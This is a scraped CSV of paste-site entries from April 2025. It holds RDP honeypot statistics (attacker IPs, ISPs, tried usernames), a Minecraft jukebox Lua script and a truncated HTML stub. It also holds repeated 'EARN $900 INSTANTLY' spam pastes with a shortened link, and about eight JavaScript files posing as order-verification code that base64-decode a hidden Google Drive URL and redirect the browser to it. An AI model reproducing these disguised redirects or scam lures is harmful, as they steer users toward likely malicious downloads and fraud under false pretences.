id,title,username,language,date,content
wk5b0b0y,2025-04-08_stats.json,rdp_snitch,JSON,Wednesday 9th of April 2025 07:18:33 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 59358,
    ""150.95.89.149"": 7971,
    ""84.17.45.14"": 999,
    ""15.204.41.136"": 16785,
    ""156.146.57.174"": 8037,
    ""156.146.57.110"": 32190,
    ""150.95.30.49"": 15891,
    ""156.146.57.52"": 8049,
    ""146.190.105.191"": 2649,
    ""147.182.229.114"": 585,
    ""106.14.144.233"": 426,
    ""191.96.106.23"": 3618,
    ""92.255.85.92"": 24,
    ""198.235.24.86"": 9,
    ""157.245.104.150"": 3,
    ""200.159.243.250"": 2076,
    ""80.94.95.90"": 12,
    ""205.210.31.86"": 9,
    ""92.53.12.65"": 3,
    ""91.238.181.96"": 6,
    ""178.20.129.235"": 6,
    ""88.214.25.123"": 6,
    ""103.97.93.115"": 9,
    ""205.210.31.180"": 9,
    ""194.180.48.89"": 3,
    ""45.227.254.132"": 9,
    ""58.218.199.219"": 12,
    ""199.45.155.95"": 3,
    ""165.154.138.151"": 3,
    ""198.235.24.178"": 9
  },
  ""asn"": {
    ""AS60068"": 60357,
    ""AS135161"": 23862,
    ""AS16276"": 16785,
    ""AS212238"": 48276,
    ""AS14061"": 3237,
    ""AS37963"": 426,
    ""AS174"": 3618,
    ""AS207566"": 24,
    ""AS396982"": 36,
    ""AS1916"": 2076,
    ""AS204428"": 12,
    ""AS43612"": 3,
    ""AS49434"": 6,
    ""AS24810"": 6,
    ""AS35042"": 6,
    ""AS134053"": 9,
    ""AS201814"": 3,
    ""AS267784"": 9,
    ""AS4134"": 12,
    ""AS398722"": 3,
    ""AS135377"": 3
  },
  ""isp"": {
    ""DataCamp Limited"": 59358,
    ""GMO-Z.COM PTE. LTD."": 23862,
    ""Datacamp Limited"": 49275,
    ""OVH SAS"": 16785,
    ""DigitalOcean, LLC"": 3237,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Cogent Communications"": 3618,
    ""Chang Way Technologies Co. Limited"": 24,
    ""Google LLC"": 36,
    ""Rede Nacional de Ensino e Pesquisa"": 2076,
    ""SS-Net"": 12,
    ""CableTEL DOOEL Macedonia Veles Triple Play"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""Teleset LLC Nchelny Branch"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 9,
    ""MEVSPACE sp. z o.o."": 3,
    ""Flyservers S.A."": 9,
    ""Chinanet"": 12,
    ""Censys, Inc."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""Cdn77 SGP"": 59358,
    ""Zcom Thai"": 23862,
    ""Cdn77 LAX CS2"": 999,
    ""OVH US LLC"": 16785,
    ""Datacamp Limited"": 48276,
    ""DigitalOcean, LLC"": 3237,
    ""Aliyun Computing Co., LTD"": 426,
    ""Ipxo"": 3618,
    ""Chang Way Technologies Co. Limited"": 24,
    ""Palo Alto Networks, Inc"": 36,
    ""Associa\u00e7\u00e3o Rede Nacional de Ensino e Pesquisa"": 2076,
    ""Unmanaged LTD"": 12,
    ""Global Communication Net EAD"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Teleset LLC"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 9,
    ""HostSlick"": 3,
    ""Xwin Universal LTD"": 9,
    ""Chinanet JS"": 12,
    ""Censys, Inc."": 3,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""North West"": 107634,
    ""Tokyo"": 7971,
    ""California"": 5238,
    ""Oregon"": 16785,
    ""Bangkok"": 15891,
    ""South West"": 2649,
    ""Shanghai"": 426,
    ""Moscow"": 24,
    ""Karnataka"": 3,
    ""Rio de Janeiro"": 2076,
    ""Sofia-Capital"": 12,
    ""Karposh"": 3,
    ""\u00cele-de-France"": 6,
    ""Tatarstan Republic"": 6,
    ""Kowloon City"": 6,
    ""Goa"": 9,
    ""Bavaria"": 3,
    ""Vilnius"": 9,
    ""Jiangsu"": 12,
    ""Kowloon"": 3,
    ""Hesse"": 3
  },
  ""country"": {
    ""Singapore"": 110283,
    ""Japan"": 7971,
    ""United States"": 22023,
    ""Thailand"": 15891,
    ""China"": 438,
    ""Russia"": 30,
    ""India"": 12,
    ""Brazil"": 2076,
    ""Bulgaria"": 12,
    ""North Macedonia"": 3,
    ""France"": 6,
    ""Hong Kong"": 9,
    ""Germany"": 6,
    ""Lithuania"": 9
  },
  ""account"": {
    ""hello"": 158664,
    ""Test"": 24,
    ""PhkJRMslo"": 3,
    ""gvOOtw"": 3,
    ""wRGfRT"": 3,
    ""Administr"": 15,
    ""lLGsjtOJy"": 3,
    ""afQBEA"": 3,
    ""gtmHLX"": 3,
    ""(empty)"": 6,
    ""Domain"": 21,
    ""ALMxKnLYm"": 3,
    ""vZsoym"": 3,
    ""mzaZgr"": 3,
    ""Administrator"": 3,
    ""dfEBqQhqA"": 3,
    ""SKFIPM"": 3,
    ""DJvDXt"": 3
  },
  ""keyboard"": {
    ""Unknown"": 158769
  },
  ""client_build"": {
    ""Unknown"": 158769
  },
  ""client_name"": {
    ""Unknown"": 158769
  },
  ""ip_type"": {
    ""hosting & proxy"": 112296,
    ""hosting"": 40692,
    ""proxy"": 3654,
    ""Unknown"": 2124,
    ""mobile"": 3
  }
}"
Ui7WpWGu,2025-04-08_stats.json,rdp_snitch,JSON,Wednesday 9th of April 2025 07:16:24 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 59357,
    ""150.95.89.149"": 7970,
    ""84.17.45.14"": 999,
    ""15.204.41.136"": 16785,
    ""156.146.57.174"": 8037,
    ""156.146.57.110"": 32190,
    ""150.95.30.49"": 15891,
    ""156.146.57.52"": 8049,
    ""146.190.105.191"": 2649,
    ""147.182.229.114"": 585,
    ""106.14.144.233"": 426,
    ""191.96.106.23"": 3618,
    ""92.255.85.92"": 24,
    ""198.235.24.86"": 9,
    ""157.245.104.150"": 3,
    ""200.159.243.250"": 2076,
    ""80.94.95.90"": 12,
    ""205.210.31.86"": 9,
    ""92.53.12.65"": 3,
    ""91.238.181.96"": 6,
    ""178.20.129.235"": 6,
    ""88.214.25.123"": 6,
    ""103.97.93.115"": 9,
    ""205.210.31.180"": 9,
    ""194.180.48.89"": 3,
    ""45.227.254.132"": 9,
    ""58.218.199.219"": 12,
    ""199.45.155.95"": 3,
    ""165.154.138.151"": 3,
    ""198.235.24.178"": 9
  },
  ""asn"": {
    ""AS60068"": 60356,
    ""AS135161"": 23861,
    ""AS16276"": 16785,
    ""AS212238"": 48276,
    ""AS14061"": 3237,
    ""AS37963"": 426,
    ""AS174"": 3618,
    ""AS207566"": 24,
    ""AS396982"": 36,
    ""AS1916"": 2076,
    ""AS204428"": 12,
    ""AS43612"": 3,
    ""AS49434"": 6,
    ""AS24810"": 6,
    ""AS35042"": 6,
    ""AS134053"": 9,
    ""AS201814"": 3,
    ""AS267784"": 9,
    ""AS4134"": 12,
    ""AS398722"": 3,
    ""AS135377"": 3
  },
  ""isp"": {
    ""DataCamp Limited"": 59357,
    ""GMO-Z.COM PTE. LTD."": 23861,
    ""Datacamp Limited"": 49275,
    ""OVH SAS"": 16785,
    ""DigitalOcean, LLC"": 3237,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Cogent Communications"": 3618,
    ""Chang Way Technologies Co. Limited"": 24,
    ""Google LLC"": 36,
    ""Rede Nacional de Ensino e Pesquisa"": 2076,
    ""SS-Net"": 12,
    ""CableTEL DOOEL Macedonia Veles Triple Play"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""Teleset LLC Nchelny Branch"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 9,
    ""MEVSPACE sp. z o.o."": 3,
    ""Flyservers S.A."": 9,
    ""Chinanet"": 12,
    ""Censys, Inc."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""Cdn77 SGP"": 59357,
    ""Zcom Thai"": 23861,
    ""Cdn77 LAX CS2"": 999,
    ""OVH US LLC"": 16785,
    ""Datacamp Limited"": 48276,
    ""DigitalOcean, LLC"": 3237,
    ""Aliyun Computing Co., LTD"": 426,
    ""Ipxo"": 3618,
    ""Chang Way Technologies Co. Limited"": 24,
    ""Palo Alto Networks, Inc"": 36,
    ""Associa\u00e7\u00e3o Rede Nacional de Ensino e Pesquisa"": 2076,
    ""Unmanaged LTD"": 12,
    ""Global Communication Net EAD"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Teleset LLC"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 9,
    ""HostSlick"": 3,
    ""Xwin Universal LTD"": 9,
    ""Chinanet JS"": 12,
    ""Censys, Inc."": 3,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""North West"": 107633,
    ""Tokyo"": 7970,
    ""California"": 5238,
    ""Oregon"": 16785,
    ""Bangkok"": 15891,
    ""South West"": 2649,
    ""Shanghai"": 426,
    ""Moscow"": 24,
    ""Karnataka"": 3,
    ""Rio de Janeiro"": 2076,
    ""Sofia-Capital"": 12,
    ""Karposh"": 3,
    ""\u00cele-de-France"": 6,
    ""Tatarstan Republic"": 6,
    ""Kowloon City"": 6,
    ""Goa"": 9,
    ""Bavaria"": 3,
    ""Vilnius"": 9,
    ""Jiangsu"": 12,
    ""Kowloon"": 3,
    ""Hesse"": 3
  },
  ""country"": {
    ""Singapore"": 110282,
    ""Japan"": 7970,
    ""United States"": 22023,
    ""Thailand"": 15891,
    ""China"": 438,
    ""Russia"": 30,
    ""India"": 12,
    ""Brazil"": 2076,
    ""Bulgaria"": 12,
    ""North Macedonia"": 3,
    ""France"": 6,
    ""Hong Kong"": 9,
    ""Germany"": 6,
    ""Lithuania"": 9
  },
  ""account"": {
    ""hello"": 158662,
    ""Test"": 24,
    ""PhkJRMslo"": 3,
    ""gvOOtw"": 3,
    ""wRGfRT"": 3,
    ""Administr"": 15,
    ""lLGsjtOJy"": 3,
    ""afQBEA"": 3,
    ""gtmHLX"": 3,
    ""(empty)"": 6,
    ""Domain"": 21,
    ""ALMxKnLYm"": 3,
    ""vZsoym"": 3,
    ""mzaZgr"": 3,
    ""Administrator"": 3,
    ""dfEBqQhqA"": 3,
    ""SKFIPM"": 3,
    ""DJvDXt"": 3
  },
  ""keyboard"": {
    ""Unknown"": 158767
  },
  ""client_build"": {
    ""Unknown"": 158767
  },
  ""client_name"": {
    ""Unknown"": 158767
  },
  ""ip_type"": {
    ""hosting & proxy"": 112295,
    ""hosting"": 40691,
    ""proxy"": 3654,
    ""Unknown"": 2124,
    ""mobile"": 3
  }
}"
4Vde6emM,2025-04-08_stats.json,rdp_snitch,JSON,Wednesday 9th of April 2025 07:15:15 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 59356,
    ""150.95.89.149"": 7969,
    ""84.17.45.14"": 999,
    ""15.204.41.136"": 16785,
    ""156.146.57.174"": 8037,
    ""156.146.57.110"": 32190,
    ""150.95.30.49"": 15891,
    ""156.146.57.52"": 8049,
    ""146.190.105.191"": 2649,
    ""147.182.229.114"": 585,
    ""106.14.144.233"": 426,
    ""191.96.106.23"": 3618,
    ""92.255.85.92"": 24,
    ""198.235.24.86"": 9,
    ""157.245.104.150"": 3,
    ""200.159.243.250"": 2076,
    ""80.94.95.90"": 12,
    ""205.210.31.86"": 9,
    ""92.53.12.65"": 3,
    ""91.238.181.96"": 6,
    ""178.20.129.235"": 6,
    ""88.214.25.123"": 6,
    ""103.97.93.115"": 9,
    ""205.210.31.180"": 9,
    ""194.180.48.89"": 3,
    ""45.227.254.132"": 9,
    ""58.218.199.219"": 12,
    ""199.45.155.95"": 3,
    ""165.154.138.151"": 3,
    ""198.235.24.178"": 9
  },
  ""asn"": {
    ""AS60068"": 60355,
    ""AS135161"": 23860,
    ""AS16276"": 16785,
    ""AS212238"": 48276,
    ""AS14061"": 3237,
    ""AS37963"": 426,
    ""AS174"": 3618,
    ""AS207566"": 24,
    ""AS396982"": 36,
    ""AS1916"": 2076,
    ""AS204428"": 12,
    ""AS43612"": 3,
    ""AS49434"": 6,
    ""AS24810"": 6,
    ""AS35042"": 6,
    ""AS134053"": 9,
    ""AS201814"": 3,
    ""AS267784"": 9,
    ""AS4134"": 12,
    ""AS398722"": 3,
    ""AS135377"": 3
  },
  ""isp"": {
    ""DataCamp Limited"": 59356,
    ""GMO-Z.COM PTE. LTD."": 23860,
    ""Datacamp Limited"": 49275,
    ""OVH SAS"": 16785,
    ""DigitalOcean, LLC"": 3237,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Cogent Communications"": 3618,
    ""Chang Way Technologies Co. Limited"": 24,
    ""Google LLC"": 36,
    ""Rede Nacional de Ensino e Pesquisa"": 2076,
    ""SS-Net"": 12,
    ""CableTEL DOOEL Macedonia Veles Triple Play"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""Teleset LLC Nchelny Branch"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 9,
    ""MEVSPACE sp. z o.o."": 3,
    ""Flyservers S.A."": 9,
    ""Chinanet"": 12,
    ""Censys, Inc."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""Cdn77 SGP"": 59356,
    ""Zcom Thai"": 23860,
    ""Cdn77 LAX CS2"": 999,
    ""OVH US LLC"": 16785,
    ""Datacamp Limited"": 48276,
    ""DigitalOcean, LLC"": 3237,
    ""Aliyun Computing Co., LTD"": 426,
    ""Ipxo"": 3618,
    ""Chang Way Technologies Co. Limited"": 24,
    ""Palo Alto Networks, Inc"": 36,
    ""Associa\u00e7\u00e3o Rede Nacional de Ensino e Pesquisa"": 2076,
    ""Unmanaged LTD"": 12,
    ""Global Communication Net EAD"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Teleset LLC"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 9,
    ""HostSlick"": 3,
    ""Xwin Universal LTD"": 9,
    ""Chinanet JS"": 12,
    ""Censys, Inc."": 3,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""North West"": 107632,
    ""Tokyo"": 7969,
    ""California"": 5238,
    ""Oregon"": 16785,
    ""Bangkok"": 15891,
    ""South West"": 2649,
    ""Shanghai"": 426,
    ""Moscow"": 24,
    ""Karnataka"": 3,
    ""Rio de Janeiro"": 2076,
    ""Sofia-Capital"": 12,
    ""Karposh"": 3,
    ""\u00cele-de-France"": 6,
    ""Tatarstan Republic"": 6,
    ""Kowloon City"": 6,
    ""Goa"": 9,
    ""Bavaria"": 3,
    ""Vilnius"": 9,
    ""Jiangsu"": 12,
    ""Kowloon"": 3,
    ""Hesse"": 3
  },
  ""country"": {
    ""Singapore"": 110281,
    ""Japan"": 7969,
    ""United States"": 22023,
    ""Thailand"": 15891,
    ""China"": 438,
    ""Russia"": 30,
    ""India"": 12,
    ""Brazil"": 2076,
    ""Bulgaria"": 12,
    ""North Macedonia"": 3,
    ""France"": 6,
    ""Hong Kong"": 9,
    ""Germany"": 6,
    ""Lithuania"": 9
  },
  ""account"": {
    ""hello"": 158660,
    ""Test"": 24,
    ""PhkJRMslo"": 3,
    ""gvOOtw"": 3,
    ""wRGfRT"": 3,
    ""Administr"": 15,
    ""lLGsjtOJy"": 3,
    ""afQBEA"": 3,
    ""gtmHLX"": 3,
    ""(empty)"": 6,
    ""Domain"": 21,
    ""ALMxKnLYm"": 3,
    ""vZsoym"": 3,
    ""mzaZgr"": 3,
    ""Administrator"": 3,
    ""dfEBqQhqA"": 3,
    ""SKFIPM"": 3,
    ""DJvDXt"": 3
  },
  ""keyboard"": {
    ""Unknown"": 158765
  },
  ""client_build"": {
    ""Unknown"": 158765
  },
  ""client_name"": {
    ""Unknown"": 158765
  },
  ""ip_type"": {
    ""hosting & proxy"": 112294,
    ""hosting"": 40690,
    ""proxy"": 3654,
    ""Unknown"": 2124,
    ""mobile"": 3
  }
}"
rb57Fs4b,EARN $900 INSTANTLY 2025⭐ G8,14k_dfdf25,JavaScript,Wednesday 9th of April 2025 07:13:15 PM CDT," 
Pdf https://tinyurl.com/privguidee


xQPy8UyKT7
"
H16kSs30,Make $1000 15-MINUTES  (BEGINNER) HV,14k_dfdf25,JavaScript,Wednesday 9th of April 2025 06:59:47 PM CDT," 
Pdf https://tinyurl.com/privguidee


GNVuGmh4h2
"
zbYtGqrd,Products.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 06:56:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18593/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vtMvi9cW,EARN $900 INSTANTLY 2025 2U,14k_dfdf25,JavaScript,Wednesday 9th of April 2025 06:46:22 PM CDT," 
Pdf https://tinyurl.com/privguidee


JrYBVkZcoR
"
VBCmkQKE,Order.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 06:40:58 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17256/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
J9rNx5KL,Make $1000 15-MINUTES (BEGINNER) FM,14k_dfdf25,JavaScript,Wednesday 9th of April 2025 06:32:56 PM CDT," 
Pdf https://tinyurl.com/privguidee


yQPfmyW7J5
"
NSGizqrC,Market.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 06:25:35 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55221/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CXvRAKaV,jukebox,HappySunChild,Lua,Wednesday 9th of April 2025 06:18:39 PM CDT,"local selection = 1
local playing = 0
local records = {
	{ ""blocks"", ""minecraft:music_disc.blocks"" },
	{ ""cat"", ""minecraft:music_disc.cat"" },
	{ ""chirp"", ""minecraft:music_disc.chirp"" },
	{ ""far"", ""minecraft:music_disc.far"" },
	{ ""mall"", ""minecraft:music_disc.mall"" },
	{ ""mellohi"", ""minecraft:music_disc.mellohi"" },
	{ ""stal"", ""minecraft:music_disc.stal"" },
	{ ""strad"", ""minecraft:music_disc.strad"" },
	{ ""ward"", ""minecraft:music_disc.ward"" },
	{ ""wait"", ""minecraft:music_disc.wait"" },
	{ ""pigstep"", ""minecraft:music_disc.pigstep"" },
}

---@type peripheral.Speaker
local speaker = peripheral.wrap(""bottom"")
local width = term.getSize()

local floor = math.floor

---@param y number
---@param text string
local function writeCenter(y, text)
	local length = string.len(text)

	term.setCursorPos(floor(width / 2 - length / 2), y)
	write(text)
end

---@param x number
---@param y number
---@param text string
local function writeRight(x, y, text)
	local length = string.len(text)

	term.setCursorPos(x - length, y)
	write(text)
end

local function displayRecords()
	term.clear()
	term.setTextColor(colors.purple)
	writeCenter(1, ""Jukebox"")

	for i = 1, #records do
		local info = records[i]
		local name = info[1]

		term.setTextColor(colors.lightGray)

		if selection == i then
			term.setTextColor(colors.white)

			name = ""> "" .. name
		end

		name = string.format(""%d. %s"", i, name)

		term.setCursorPos(2, i + 2)
		write(name)
	end

	local playingRecord = records[playing]
	local playingName = playingRecord and playingRecord[1] or ""None""

	term.setTextColor(colors.lightGray)
	writeRight(width, 2, string.format(""Playing: %s"", playingName))
end

displayRecords()

while true do
	local _, key = os.pullEvent(""key"")

	if key == keys.up then
		selection = math.max(selection - 1, 1)
	elseif key == keys.down then
		selection = math.min(selection + 1, #records)
	elseif key == keys.enter then
		local info = records[selection]

		if speaker.playSound(info[2], 2, 1) then
			playing = selection
		end
	end

	displayRecords()
end
"
YuYbjWmw,Untitled,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 06:10:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12915/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
y6zbAxDF,Products.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 05:54:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06968/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ap7DnAnh,Order.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 05:39:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26908/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VJMzUgtB,Market.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 05:24:04 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97830/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dkGycD3P,Untitled,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 05:08:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48891/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3VHH5nDv,Untitled,lemansky,HTML,Wednesday 9th of April 2025 04:59:43 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
	<meta charset=""UTF-8"">
	<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
	<title>Document</title>
	<script>
